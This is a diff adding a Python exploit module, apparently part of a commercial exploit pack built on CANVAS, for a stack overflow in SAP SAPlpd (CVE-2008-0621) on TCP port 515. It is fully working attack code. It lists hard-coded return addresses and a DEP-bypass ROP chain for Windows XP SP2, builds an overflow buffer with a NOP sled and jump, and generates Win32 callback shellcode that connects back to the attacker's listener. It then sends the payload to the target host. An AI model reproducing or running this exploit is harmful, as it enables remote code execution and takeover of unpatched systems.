@@ -1,0 +1,150 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+
+import sys
+import random
+
+if "." not in sys.path: 
+		sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "SAP AG SAPlpd 6.28 Stack Overflow"
+
+DESCRIPTION = "Stack overflow vulnerability in SAP AG SAPlpd 6.28"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "2008.02.07"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/27613"
+DOCUMENTATION["VersionsAffected"] = "SAP SAP GUI for Windows 6.40"
+DOCUMENTATION["CVE Name"] = "CVE-2008-0621"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0621"
+
+VERSION = "0.1"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000", "XP", "2003" ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0: [ "Any Windows without DEP", 0x004e1c03 ], # jmp esp @ saplpd.exe    
+    1: [ "Windows XP SP2 English (DEP)", 0x0042f9a5, 0x7cbb3fdc, 0x77c51931, 0x0042f8a5, 0x7c91d3f8, 0x004e1c03 ] # anti-dep
+}
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+        self.name = NAME       
+        self.port = 515
+        self.version = 0      
+        self.badstring = "\x00"
+        return
+
+    def neededListenerTypes(self):
+        from canvasengine import WIN32MOSDEF
+        return [WIN32MOSDEF]
+        
+    def createShellcode(self):
+				return self.createSmallWin32Shellcode(self.callback.ip, self.callback.port, subesp = 1000, badstring = self.badstring)		    
+
+    def run(self):
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+                        
+        s = self.gettcpsock()
+        s.connect((self.host, self.port))
+                        
+        s.sendall(sploitstring)                  
+
+        self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
+        self.log("%s done (succeeded!)" % self.name)
+        
+        return 1        
+        
+    def makesploit(self):
+        """
+        Construct the attack        			  
+				
+				"""        			
+								
+        buff = "\x90" * 484									
+        jmp = "\xE9\x98\x08\x00\x00"
+        info = str(struct.pack('<L', 0x0049CA10))
+				
+        tmp = buff[0:4]
+        tmp += self.shellcode
+        tmp += buff[4 + len(self.shellcode):]				
+						
+				# Windows XP SP2 with DEP	
+        if (self.version >= 1): 
+					os_name, addr, anti_dep_1, anti_dep_2, anti_dep_3, anti_dep_4, ret = targets[self.version]
+        	
+					jmp_esp = str(struct.pack('<L', ret))					
+        																														
+					# push esp / pop ebp /ret
+					# mov eax,1 
+					# add esp,14 
+					# anti-dep 
+					
+					add_esp = str(struct.pack('<L', addr))										
+					pop_ebp = str(struct.pack('<L', anti_dep_1))
+					mov_eax = str(struct.pack('<L', anti_dep_2))					
+					add_esp_14 = str(struct.pack('<L', anti_dep_3))
+					anti_dep = str(struct.pack('<L', anti_dep_4))																																
+	        	
+					sploitstring = "\x01" + tmp + add_esp + jmp + ("\x00" * 3) + info + "D" * 4 + pop_ebp + mov_eax + add_esp_14 + "\xFF" * 0x14 + anti_dep + jmp_esp + tmp + "E" * 1500
+					
+				# Windows without DEP
+        else: 
+					os_name, jmp_esp = targets[self.version]
+					
+					ret = str(struct.pack('<L', jmp_esp))				
+  				 				  				
+					sploitstring = "\x01" + tmp + ret + jmp + "\x00" * 3 + info + "D" * 4 + "E" * 1500
+					  		
+        return sploitstring
+        		
+    def usage(self):        
+        print "Usage: %s -v version -t host -l localip -d localport\n" % sys.argv[0]
+        
+        i = 0
+        
+        print 'Available versions:'
+        
+        for listline in targets.values():
+            print '\t%d: %s'%(i, listline[0])
+            i = i + 1
+        
+        sys.exit(0) 
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
